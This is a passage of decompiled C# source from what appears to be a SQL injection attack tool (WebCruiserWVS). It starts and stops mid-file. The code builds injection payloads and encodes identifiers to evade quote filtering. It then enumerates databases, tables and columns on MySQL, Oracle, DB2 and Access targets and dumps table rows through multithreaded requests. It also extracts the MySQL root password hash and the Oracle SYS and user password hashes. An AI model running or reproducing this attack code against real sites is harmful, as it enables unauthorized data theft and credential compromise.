            this.UpdateKeyWordText("");
            this.mainfrm.CurrentSite.InjType = InjectionType.UnKnown;
            this.UpdateComboInjType("UnKnown");
            this.listViewEnv.Items.Clear();
            foreach (TreeNode node in this.treeViewDB.Nodes)
            {
                node.Remove();
            }
            foreach (ListViewItem item in this.listViewData.Items)
            {
                item.Remove();
            }
        }

        private void ClearListView(ListView lv)
        {
            if (!lv.InvokeRequired)
            {
                lv.Items.Clear();
            }
            else
            {
                ClearDD method = new ClearDD(this.ClearListView);
                base.Invoke(method, new object[] { lv });
            }
        }

        private void cmbDBTypeList_DropDownClosed(object sender, EventArgs e)
        {
            if (this.cmbDBTypeList.Text == "UnKnown")
            {
                this.mainfrm.CurrentSite.DatabaseType = DBType.UnKnown;
                this.listViewEnv.Items.Clear();
            }
            else
            {
                if (this.cmbDBTypeList.Text == "SQLServer")
                {
                    this.mainfrm.CurrentSite.DatabaseType = DBType.SQLServer;
                }
                else if (this.cmbDBTypeList.Text == "Oracle")
                {
                    this.mainfrm.CurrentSite.DatabaseType = DBType.Oracle;
                }
                else if (this.cmbDBTypeList.Text == "MySQL")
                {
                    this.mainfrm.CurrentSite.DatabaseType = DBType.MySQL;
                }
                else if (this.cmbDBTypeList.Text == "Access")
                {
                    this.mainfrm.CurrentSite.DatabaseType = DBType.Access;
                }
                else if (this.cmbDBTypeList.Text == "DB2")
                {
                    this.mainfrm.CurrentSite.DatabaseType = DBType.DB2;
                }
                else if (this.cmbDBTypeList.Text == "Other")
                {
                    this.mainfrm.CurrentSite.DatabaseType = DBType.Other;
                }
                this.InitByDBType(false);
            }
        }

        private void cmbInjectionType_DropDownClosed(object sender, EventArgs e)
        {
            string text = this.cmbInjectionType.Text;
            if (text.Equals("UnKnown"))
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.UnKnown;
                this.PreFix = "";
                this.PostFix = "";
            }
            else if (text.Equals("Integer"))
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.Integer;
                this.PreFix = "";
                this.PostFix = "";
            }
            else if (text.Equals("String"))
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.String;
                this.PreFix = "%27";
                this.PostFix = "%20and%20%271%27=%271";
            }
            else if (text.Equals("Search"))
            {
                this.mainfrm.CurrentSite.InjType = InjectionType.Search;
                this.PreFix = "%27";
                this.PostFix = "%20or%20%27%25%27%3D%27";
            }
        }

        private void DataItemClick(object sender, EventArgs e)
        {
            try
            {
                string str2;
                string text = this.listViewData.SelectedItems[0].Text;
                for (int i = 1; i < this.listViewData.SelectedItems[0].SubItems.Count; i++)
                {
                    text = text + "\t" + this.listViewData.SelectedItems[0].SubItems[i].Text;
                }
                if (((str2 = ((ToolStripMenuItem) sender).Text) != null) && (str2 == "Copy Data Row To ClipBoard"))
                {
                    Clipboard.SetText(text);
                }
            }
            catch
            {
            }
        }

        private void DB2GetColumnDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[0];
                string str3 = strArray[1];
                string str4 = strArray[2];
                string itemName = strArray[3];
                string str6 = "";
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    str6 = this.GetItemByDB2("select ", "NAME", "from (select name from (select name from sysibm.syscolumns where tbname=" + this.EscapeSingleQuotes(itemName) + " order by name fetch first " + str4 + " rows only) sq order by name desc fetch first 1 rows only)T", 0xff, 0x80);
                }
                if (string.IsNullOrEmpty(str6))
                {
                    str6 = this.GetItemByDB2("select ", "NAME", "from (select name from sysibm.syscolumns where tbname=" + this.EscapeSingleQuotes(itemName) + " order by name fetch first " + str4 + " rows only) sq order by name desc fetch first 1 rows only", 0xff, 0x80);
                }
                this.AddColumn2TreeView(str2 + "^" + str3 + "^" + str6);
            }
            catch
            {
            }
        }

        private void DB2GetDataDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { ':' });
                string itemName = strArray[0];
                string str2 = strArray[1];
                string str3 = strArray[2];
                int num = int.Parse(strArray[3]);
                string str4 = strArray[4];
                string str5 = "";
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    string[] strArray2 = new string[] { "from (select  ", str2, " from (select  ", str2, " from ", str3, " order by ", str4, " fetch first ", (num + 1).ToString(), " rows only) sq order by ", str4, " desc fetch first 1 rows only)T" };
                    str5 = this.GetItemByDB2("select", itemName, string.Concat(strArray2), 0xff, 0x400);
                }
                if (string.IsNullOrEmpty(str5))
                {
                    string[] strArray3 = new string[] { "from (select  ", str2, " from ", str3, " order by ", str4, " fetch first ", (num + 1).ToString(), " rows only) sq order by ", str4, " desc fetch first 1 rows only" };
                    str5 = this.GetItemByDB2("select", itemName, string.Concat(strArray3), 0xff, 0x400);
                }
                this.AddItem2ListViewData(str5);
            }
            catch
            {
            }
        }

        private void DB2GetTableDoWork(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                string[] strArray = ((string) data).Split(new char[] { '^' });
                string str2 = strArray[1];
                string str3 = "";
                if (this.mainfrm.CurrentSite.BlindInjType == BlindType.FieldEcho)
                {
                    str3 = this.GetItemByDB2("select", "NAME", "from (SELECT name from (SELECT name FROM sysibm.systables where creator=user order by name fetch first " + str2 + " rows only) sq order by name desc fetch first 1 rows only)T", 0xff, 0x80);
                }
                if (string.IsNullOrEmpty(str3))
                {
                    str3 = this.GetItemByDB2("select", "NAME", "from (SELECT name FROM sysibm.systables where creator=user order by name fetch first " + str2 + " rows only) sq order by name desc fetch first 1 rows only", 0xff, 0x80);
                }
                this.AddTable2TreeView(strArray[0] + "^" + str3);
            }
            catch
            {
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        public void EnableFunc(bool RegOK)
        {
            this.toolStripDB.Enabled = RegOK;
        }

        private string EscapeSingleQuotes(string ItemName)
        {
            if (string.IsNullOrEmpty(ItemName))
            {
                return "";
            }
            char[] chArray = ItemName.ToCharArray();
            byte[] bytes = Encoding.Default.GetBytes(ItemName);
            string str = "";
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.SQLServer)
            {
                str = str + "0x";
                byte num = 0;
                byte num2 = 0;
                for (int j = 0; j < chArray.Length; j++)
                {
                    num2 = (byte) (chArray[j] & '\x00ff');
                    num = (byte) (chArray[j] >> 8);
                    str = str + string.Format("{0:X2}{1:X2}", num2, num);
                }
                return str;
            }
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.MySQL)
            {
                for (int k = 0; k < bytes.Length; k++)
                {
                    if (!string.IsNullOrEmpty(str))
                    {
                        str = str + ",";
                    }
                    str = str + string.Format("{0:D}", (int) bytes[k]);
                }
                return ("char(" + str + ")");
            }
            if (this.mainfrm.CurrentSite.DatabaseType == DBType.Oracle)
            {
                for (int m = 0; m < chArray.Length; m++)
                {
                    if (!string.IsNullOrEmpty(str))
                    {
                        str = str + "||";
                    }
                    str = str + "chr(" + string.Format("{0:D}", this.UnicodeInt2UTF8Int(chArray[m])) + ")";
                }
                return str;
            }
            if (this.mainfrm.CurrentSite.DatabaseType != DBType.DB2)
            {
                return ItemName;
            }
            for (int i = 0; i < bytes.Length; i++)
            {
                if (!string.IsNullOrEmpty(str))
                {
                    str = str + "||";
                }
                str = str + "chr(" + string.Format("{0:D}", (int) bytes[i]) + ")";
            }
            return str;
        }

        private void ExecAccessCheck(object data)
        {
            this.mainfrm.DisplayProgress("Auto Checking ...");
            int listViewCount = this.GetListViewCount(this.listViewEnv);
            for (int i = 0; i < listViewCount; i++)
            {
                if (this.ListViewInfoItemIsChecked(i))
                {
                    string str = this.ReadListViewInfoItems(i);
                    if (this.mainfrm.CurrentSite.BlindInjType == BlindType.UnKnown)
                    {
                        this.GetBlindType(this.URL);
                    }
                    if (str.Equals("Server"))
                    {
                        if (string.IsNullOrEmpty(this.Server))
                        {
                            this.Server = this.GetServer(this.URL);
                        }
                        if (string.IsNullOrEmpty(this.Server))
                        {
                            this.Server = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.Server);
                    }
                }
            }
        }

        private void ExecAccessGetColumn(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                }
                if (!string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
                    {
                        this.mainfrm.CurrentSite.InjType = this.GetInjectionType();
                    }
                    string[] strArray = WebCruiserWVS.Default.AccessColumns.Split(new char[] { ':' });
                    int length = strArray.Length;
                    int treeViewDBCount = this.GetTreeViewDBCount("0");
                    for (int i = 0; i < treeViewDBCount; i++)
                    {
                        if (this.TreeViewDBChecked("0^" + i.ToString()))
                        {
                            this.mainfrm.DisplayProgress("Getting Columns ...");
                            string treeViewDBText = this.GetTreeViewDBText("0^" + i.ToString());
                            for (int j = 0; j < length; j++)
                            {
                                string str2 = strArray[j];
                                if (!string.IsNullOrEmpty(str2))
                                {
                                    string state = i.ToString() + "^" + treeViewDBText + "^" + str2;
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.AccessGetColumnDoWork), state);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void ExecAccessGetData(int RowsBegin, int RowsEnd)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                int treeViewDBCount = this.GetTreeViewDBCount("0");
                for (int i = 0; i < treeViewDBCount; i++)
                {
                    if (this.TreeViewDBChecked("0^" + i.ToString()))
                    {
                        string treeViewDBText = this.GetTreeViewDBText("0^" + i.ToString());
                        string str2 = "";
                        string str3 = "";
                        string str4 = "";
                        int num3 = this.GetTreeViewDBCount("0^" + i.ToString());
                        for (int j = 0; j < num3; j++)
                        {
                            if (this.TreeViewDBChecked("0^" + i.ToString() + "^" + j.ToString()))
                            {
                                string str5 = this.GetTreeViewDBText("0^" + i.ToString() + "^" + j.ToString());
                                if (string.IsNullOrEmpty(str2))
                                {
                                    str4 = "[" + str5 + "]";
                                }
                                else
                                {
                                    str2 = str2 + "%2Bchr(94)%2B";
                                    str3 = str3 + ",";
                                }
                                str2 = str2 + "cstr([" + str5 + "])";
                                str3 = str3 + "[" + str5 + "]";
                            }
                        }
                        int num5 = 0;
                        num5 = this.GetIntValueByAccess("select", "count(1)", "from [" + treeViewDBText + "]", RowsEnd, 0);
                        this.mainfrm.DisplayProgress("Get Rows Num: " + num5.ToString());
                        if (num5 == 0)
                        {
                            MessageBox.Show("No Records Found!", "Information");
                        }
                        else
                        {
                            if ((num5 > 0) && (num5 < RowsEnd))
                            {
                                RowsEnd = num5;
                                this.txtRowsEnd.Text = num5.ToString();
                            }
                            if (RowsBegin > RowsEnd)
                            {
                                MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num5.ToString());
                            }
                            else
                            {
                                for (int k = RowsBegin - 1; k < RowsEnd; k++)
                                {
                                    string state = str2 + "^" + k.ToString() + "^" + str3 + "^[" + treeViewDBText + "]^" + str4;
                                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.AccessGetDataDoWork), state);
                                }
                            }
                        }
                        return;
                    }
                }
            }
            catch
            {
            }
        }

        private void ExecAccessGetTable(object data)
        {
            try
            {
                if (WebSite.CurrentStatus == TaskStatus.Stop)
                {
                    Thread.CurrentThread.Abort();
                }
                if (string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
                }
                if (!string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
                {
                    if (this.mainfrm.CurrentSite.InjType == InjectionType.UnKnown)
                    {
                        this.mainfrm.CurrentSite.InjType = this.GetInjectionType();
                    }
                    this.mainfrm.DisplayProgress("Getting Tables ...");
                    string[] strArray = WebCruiserWVS.Default.AccessTables.Split(new char[] { ':' });
                    int length = strArray.Length;
                    for (int i = 0; i < length; i++)
                    {
                        string str = strArray[i];
                        if (!string.IsNullOrEmpty(str))
                        {
                            ThreadPool.QueueUserWorkItem(new WaitCallback(this.AccessGetTableDoWork), str);
                        }
                    }
                }
            }
            catch
            {
            }
        }

        private void ExecDB2Check(object data)
        {
            this.mainfrm.DisplayProgress("Auto Checking ...");
            this.mainfrm.CurrentSite.CurrentKeyWord = this.GetKeyWord(this.URL);
            if (!string.IsNullOrEmpty(this.mainfrm.CurrentSite.CurrentKeyWord))
            {
                for (int i = 0; i < this.listViewEnv.Items.Count; i++)
                {
                    if (this.ListViewInfoItemIsChecked(i))
                    {
                        string str = this.ReadListViewInfoItems(i);
                        if (str.Equals("Version"))
                        {
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetItemByDB2("select", "rtrim(char(versionnumber))", "from sysibm.sysversions", 0x7e, 0x20));
                        }
                        else if (str.Equals("Server"))
                        {
                            if (string.IsNullOrEmpty(this.Server))
                            {
                                this.Server = this.GetServer(this.URL);
                            }
                            if (string.IsNullOrEmpty(this.Server))
                            {
                                this.Server = "NULL";
                            }
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.Server);
                        }
                        else if (str.Equals("user"))
                        {
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetItemByDB2("select", "rtrim(user)", "from sysibm.sysdummy1", 0xff, 0x80));
                        }
                        else if (str.Equals("Database"))
                        {
                            string str4 = this.GetItemByDB2("select", "rtrim(current server)", "from sysibm.sysdummy1", 0xff, 0x80);
                            this.AddSubItem2ListViewInfo(i.ToString() + "^" + str4);
                            if (!string.IsNullOrEmpty(str4))
                            {
                                this.AddDB2TreeView(str4);
                            }
                        }
                    }
                }
                this.mainfrm.DisplayProgress("Done");
            }
        }

        private void ExecDB2GetColumn(object data)
        {
            DateTime now = DateTime.Now;
            string itemName = "";
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    this.GetTreeViewDBText(i.ToString());
                    int num4 = this.GetTreeViewDBCount(i.ToString());
                    for (int j = 0; j < num4; j++)
                    {
                        if (this.TreeViewDBChecked(i.ToString() + "^" + j.ToString()))
                        {
                            this.mainfrm.DisplayProgress("Getting Columns ...");
                            string state = "";
                            itemName = this.GetTreeViewDBText(i.ToString() + "^" + j.ToString());
                            int num = this.GetIntValue("select count(NAME) FROM sysibm.syscolumns where tbname=" + this.EscapeSingleQuotes(itemName), 0x80, 0);
                            this.mainfrm.DisplayProgress("Get Column Num: " + num.ToString());
                            if (num < 0)
                            {
                                num = 0x80;
                            }
                            for (int k = 0; k < num; k++)
                            {
                                string[] strArray = new string[] { i.ToString(), "^", j.ToString(), "^", (k + 1).ToString(), "^", itemName };
                                state = string.Concat(strArray);
                                ThreadPool.QueueUserWorkItem(new WaitCallback(this.DB2GetColumnDoWork), state);
                            }
                            break;
                        }
                    }
                }
            }
        }

        private void ExecDB2GetData(int RowsBegin, int RowsEnd)
        {
            this.mainfrm.DisplayProgress("Getting Data ...");
            string str = "";
            foreach (TreeNode node in this.treeViewDB.Nodes)
            {
                if (node.Checked)
                {
                    string text = node.Text;
                    foreach (TreeNode node2 in node.Nodes)
                    {
                        if (node2.Checked)
                        {
                            str = node2.Text;
                            string str2 = "";
                            string str3 = "";
                            string str4 = "";
                            foreach (TreeNode node3 in node2.Nodes)
                            {
                                if (node3.Checked)
                                {
                                    if (string.IsNullOrEmpty(str2))
                                    {
                                        str4 = node3.Text;
                                    }
                                    else
                                    {
                                        str2 = str2 + "||chr(94)||";
                                    }
                                    str2 = str2 + "coalesce(rtrim(cast(" + node3.Text + " as char(250))),chr(32))";
                                    if (!string.IsNullOrEmpty(str3))
                                    {
                                        str3 = str3 + ",";
                                    }
                                    str3 = str3 + node3.Text;
                                }
                            }
                            int num = this.GetIntValue("select count(1) from " + str, RowsEnd, 0);
                            this.mainfrm.DisplayProgress("Get Rows Num: " + num.ToString());
                            if (num == 0)
                            {
                                MessageBox.Show("No Records Found!");
                            }
                            else
                            {
                                if ((num > 0) && (num < RowsEnd))
                                {
                                    RowsEnd = num;
                                    this.txtRowsEnd.Text = num.ToString();
                                }
                                if (RowsBegin > RowsEnd)
                                {
                                    MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num.ToString());
                                }
                                else
                                {
                                    for (int i = RowsBegin - 1; i < RowsEnd; i++)
                                    {
                                        string state = str2 + ":" + str3 + ":" + str + ":" + i.ToString() + ":" + str4;
                                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.DB2GetDataDoWork), state);
                                    }
                                }
                            }
                            break;
                        }
                    }
                    break;
                }
            }
        }

        private void ExecDB2GetDB()
        {
            this.mainfrm.DisplayProgress("Getting DB ...");
            string str = this.GetItemByDB2("select", "current server", "from sysibm.sysdummy1", 0xff, 0x80);
            if (!string.IsNullOrEmpty(str))
            {
                this.AddDB2TreeView(str);
            }
            this.mainfrm.DisplayProgress("Done");
        }

        private void ExecDB2GetTable(object data)
        {
            this.mainfrm.DisplayProgress("Getting Tables ...");
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    this.GetTreeViewDBText(i.ToString());
                    int num = this.GetIntValue("select count(1) from sysibm.systables where creator=user", 0x100, 0);
                    this.mainfrm.DisplayProgress("Get Table Num: " + num.ToString());
                    if (num < 0)
                    {
                        num = 0x100;
                    }
                    string[] strArray = new string[num];
                    for (int j = 0; j < num; j++)
                    {
                        strArray[j] = i.ToString() + "^" + ((j + 1)).ToString();
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.DB2GetTableDoWork), strArray[j]);
                    }
                    return;
                }
            }
        }

        private void ExecMySQLCheck(object data)
        {
            this.mainfrm.DisplayProgress("Auto Checking ...");
            for (int i = 0; i < this.listViewEnv.Items.Count; i++)
            {
                if (this.ListViewInfoItemIsChecked(i))
                {
                    string str = this.ReadListViewInfoItems(i);
                    if (str.Equals("Version"))
                    {
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetItemByMySQL("select", "@@version", "", 0x7e, 0x20));
                    }
                    else if (str.Equals("Server"))
                    {
                        if (string.IsNullOrEmpty(this.Server))
                        {
                            this.Server = this.GetServer(this.URL);
                        }
                        if (string.IsNullOrEmpty(this.Server))
                        {
                            this.Server = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.Server);
                    }
                    else if (str.Equals("OS"))
                    {
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetItemByMySQL("select", "@@version_compile_os", "", 0x7e, 0x20));
                    }
                    else if (str.Equals("user"))
                    {
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetItemByMySQL("select", "user()", "", 0xff, 0x20));
                    }
                    else if (str.Equals("Database"))
                    {
                        string str5 = this.GetItemByMySQL("select", "database()", "", 0xff, 0x80);
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + str5);
                        if (!string.IsNullOrEmpty(str5))
                        {
                            this.AddDB2TreeView(str5);
                        }
                    }
                    else if (str.Equals("root_PasswordHash"))
                    {
                        string str6 = this.GetItemByMySQL("select", "Password", "from mysql.user where User=char(114,111,111,116)", 0x7e, 0x40);
                        if (string.IsNullOrEmpty(str6))
                        {
                            str6 = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + str6);
                    }
                }
            }
            this.mainfrm.DisplayProgress("Done");
        }

        private void ExecMySQLGetColumn(object data)
        {
            DateTime now = DateTime.Now;
            string itemName = "";
            string treeViewDBText = "";
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    itemName = this.GetTreeViewDBText(i.ToString());
                    int num4 = this.GetTreeViewDBCount(i.ToString());
                    for (int j = 0; j < num4; j++)
                    {
                        if (this.TreeViewDBChecked(i.ToString() + "^" + j.ToString()))
                        {
                            this.mainfrm.DisplayProgress("Getting Columns ...");
                            string state = "";
                            treeViewDBText = this.GetTreeViewDBText(i.ToString() + "^" + j.ToString());
                            int num = this.GetIntValue("select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=" + this.EscapeSingleQuotes(itemName) + "%20and TABLE_NAME=" + this.EscapeSingleQuotes(treeViewDBText), 0x80, 0);
                            this.mainfrm.DisplayProgress("Get Column Num: " + num.ToString());
                            if (num < 0)
                            {
                                num = 0x80;
                            }
                            for (int k = 0; k < num; k++)
                            {
                                state = i.ToString() + "^" + j.ToString() + "^" + k.ToString() + "^" + itemName + "^" + treeViewDBText;
                                ThreadPool.QueueUserWorkItem(new WaitCallback(this.MySQLGetColumnDoWork), state);
                            }
                            break;
                        }
                    }
                }
            }
        }

        private void ExecMySQLGetData(int RowsBegin, int RowsEnd)
        {
            this.mainfrm.DisplayProgress("Getting Data ...");
            string text = "";
            string str2 = "";
            foreach (TreeNode node in this.treeViewDB.Nodes)
            {
                if (node.Checked)
                {
                    text = node.Text;
                    foreach (TreeNode node2 in node.Nodes)
                    {
                        if (node2.Checked)
                        {
                            str2 = node2.Text;
                            string str3 = "";
                            foreach (TreeNode node3 in node2.Nodes)
                            {
                                if (node3.Checked)
                                {
                                    if (!string.IsNullOrEmpty(str3))
                                    {
                                        str3 = str3 + ",";
                                    }
                                    str3 = str3 + "ifnull(cast(`" + node3.Text + "` as char),char(32))";
                                }
                            }
                            str3 = "concat_ws(char(94)," + str3 + ")";
                            int num = this.GetIntValue("select count(1) from " + text + "." + str2, RowsEnd, 0);
                            this.mainfrm.DisplayProgress("Get Rows Num: " + num.ToString());
                            if (num == 0)
                            {
                                MessageBox.Show("No Records Found!");
                            }
                            else
                            {
                                if ((num > 0) && (num < RowsEnd))
                                {
                                    RowsEnd = num;
                                    this.txtRowsEnd.Text = num.ToString();
                                }
                                if (RowsBegin > RowsEnd)
                                {
                                    MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num.ToString());
                                }
                                else
                                {
                                    for (int i = RowsBegin - 1; i < RowsEnd; i++)
                                    {
                                        string state = str3 + "^" + text + "^" + str2 + "^" + i.ToString();
                                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.MySQLGetDataDoWork), state);
                                    }
                                }
                            }
                            break;
                        }
                    }
                    break;
                }
            }
        }

        private void ExecMySQLGetDB()
        {
            this.mainfrm.DisplayProgress("Getting DB ...");
            if (this.cmbChkAllDB.SelectedIndex == 0)
            {
                string str = this.GetItemByMySQL("select", "database()", "", 0xff, 0x80);
                if (!string.IsNullOrEmpty(str))
                {
                    this.AddDB2TreeView(str);
                }
                this.mainfrm.DisplayProgress("Done");
            }
            else
            {
                int num = this.GetIntValue("select count(SCHEMA_NAME) from information_schema.SCHEMATA", 0x80, 0);
                this.mainfrm.DisplayProgress("Get DB Num: " + num.ToString());
                if (num < 1)
                {
                    this.mainfrm.DisplayProgress("Done");
                }
                else
                {
                    for (int i = 0; i < num; i++)
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.MySQLGetDBDoWork), i);
                    }
                }
            }
        }

        private void ExecMySQLGetTable(object data)
        {
            this.mainfrm.DisplayProgress("Getting Tables ...");
            DateTime now = DateTime.Now;
            string itemName = "";
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    itemName = this.GetTreeViewDBText(i.ToString());
                    int num = this.GetIntValue("select count(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=" + this.EscapeSingleQuotes(itemName), 0x100, 0);
                    this.mainfrm.DisplayProgress("Get Table Num: " + num.ToString());
                    if (num < 0)
                    {
                        num = 0x100;
                    }
                    for (int j = 0; j < num; j++)
                    {
                        string state = i.ToString() + "^" + j.ToString() + "^" + itemName;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.MySQLGetTableDoWork), state);
                    }
                    return;
                }
            }
        }

        private void ExecOracleCheck(object data)
        {
            this.mainfrm.DisplayProgress("Auto Checking ...");
            for (int i = 0; i < this.listViewEnv.Items.Count; i++)
            {
                if (this.ListViewInfoItemIsChecked(i))
                {
                    string str = this.ReadListViewInfoItems(i);
                    if (str.Equals("Version"))
                    {
                        string str2 = this.GetItemByOracle("select", "version", "from v$instance", 0x7e, 0x40);
                        if (string.IsNullOrEmpty(str2))
                        {
                            str2 = this.GetItemByOracle("select", "banner", "from v$version where banner like %27TNS%25%27", 0x7e, 0x40);
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + str2);
                    }
                    else if (str.Equals("Server"))
                    {
                        if (string.IsNullOrEmpty(this.Server))
                        {
                            this.Server = this.GetServer(this.URL);
                        }
                        if (string.IsNullOrEmpty(this.Server))
                        {
                            this.Server = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.Server);
                    }
                    else if (str.Equals("user"))
                    {
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + this.GetItemByOracle("select", "user", "from dual", 0xff, 0x80));
                    }
                    else if (str.Equals("instance_name"))
                    {
                        string str4 = this.GetItemByOracle("select", "instance_name", "from v$instance", 0xff, 0x80);
                        if (string.IsNullOrEmpty(str4))
                        {
                            str4 = this.GetItemByOracle("select", "name", "from v$database", 0xff, 0x80);
                        }
                        if (string.IsNullOrEmpty(str4))
                        {
                            str4 = this.GetItemByOracle("select", "SYS.DATABASE_NAME", "FROM DUAL", 0xff, 0x80);
                        }
                        if (string.IsNullOrEmpty(str4))
                        {
                            str4 = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + str4);
                        if (!string.IsNullOrEmpty(str4))
                        {
                            this.AddDB2TreeView(str4);
                        }
                    }
                    else if (str.Equals("SYS_PasswordHash"))
                    {
                        string str5 = this.GetItemByOracle("select", "PASSWORD", "from dba_users where username=chr(83)||chr(89)||chr(83)", 0x7e, 0x40);
                        if (string.IsNullOrEmpty(str5))
                        {
                            str5 = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + str5);
                    }
                    else if (str.Equals("user_PasswordHash"))
                    {
                        string str6 = this.GetItemByOracle("select", "PASSWORD", "from dba_users where username=user", 0x7e, 0x40);
                        if (string.IsNullOrEmpty(str6))
                        {
                            str6 = "NULL";
                        }
                        this.AddSubItem2ListViewInfo(i.ToString() + "^" + str6);
                    }
                }
            }
            this.mainfrm.DisplayProgress("Done");
        }

        private void ExecOracleGetColumn(object data)
        {
            DateTime now = DateTime.Now;
            string itemName = "";
            int treeViewDBCount = this.GetTreeViewDBCount("");
            for (int i = 0; i < treeViewDBCount; i++)
            {
                if (this.TreeViewDBChecked(i.ToString()))
                {
                    this.GetTreeViewDBText(i.ToString());
                    int num4 = this.GetTreeViewDBCount(i.ToString());
                    for (int j = 0; j < num4; j++)
                    {
                        if (this.TreeViewDBChecked(i.ToString() + "^" + j.ToString()))
                        {
                            this.mainfrm.DisplayProgress("Getting Columns ...");
                            string state = "";
                            itemName = this.GetTreeViewDBText(i.ToString() + "^" + j.ToString());
                            int num = this.GetIntValue("select count(COLUMN_NAME) FROM user_tab_columns WHERE table_name=" + this.EscapeSingleQuotes(itemName), 0x80, 0);
                            this.mainfrm.DisplayProgress("Get Column Num: " + num.ToString());
                            if (num < 0)
                            {
                                num = 0x80;
                            }
                            for (int k = 0; k < num; k++)
                            {
                                string[] strArray = new string[] { i.ToString(), "^", j.ToString(), "^", (k + 1).ToString(), "^", itemName };
                                state = string.Concat(strArray);
                                ThreadPool.QueueUserWorkItem(new WaitCallback(this.OracleGetColumnDoWork), state);
                            }
                            break;
                        }
                    }
                }
            }
        }

        private void ExecOracleGetData(int RowsBegin, int RowsEnd)
        {
            this.mainfrm.DisplayProgress("Getting Data ...");
            string str = "";
            foreach (TreeNode node in this.treeViewDB.Nodes)
            {
                if (node.Checked)
                {
                    string text = node.Text;
                    foreach (TreeNode node2 in node.Nodes)
                    {
                        if (node2.Checked)
                        {
                            str = node2.Text;
                            string str2 = "";
                            string str3 = "";
                            foreach (TreeNode node3 in node2.Nodes)
                            {
                                if (node3.Checked)
                                {
                                    if (!string.IsNullOrEmpty(str2))
                                    {
                                        str2 = str2 + "||chr(94)||";
                                    }
                                    str2 = str2 + "NVL(cast(" + node3.Text + " as varchar(64)),chr(32))";
                                    if (!string.IsNullOrEmpty(str3))
                                    {
                                        str3 = str3 + ",";
                                    }
                                    str3 = str3 + node3.Text;
                                }
                            }
                            int num = this.GetIntValue("select count(1) from " + str, RowsEnd, 0);
                            this.mainfrm.DisplayProgress("Get Rows Num: " + num.ToString());
                            if (num == 0)
                            {
                                MessageBox.Show("No Records Found!");
                            }
                            else
                            {
                                if ((num > 0) && (num < RowsEnd))
                                {
                                    RowsEnd = num;
                                    this.txtRowsEnd.Text = num.ToString();
                                }
                                if (RowsBegin > RowsEnd)
                                {
                                    MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num.ToString());
                                }
                                else
                                {
                                    for (int i = RowsBegin - 1; i < RowsEnd; i++)
                                    {
                                        string state = str2 + ":" + str3 + ":" + str + ":" + i.ToString();
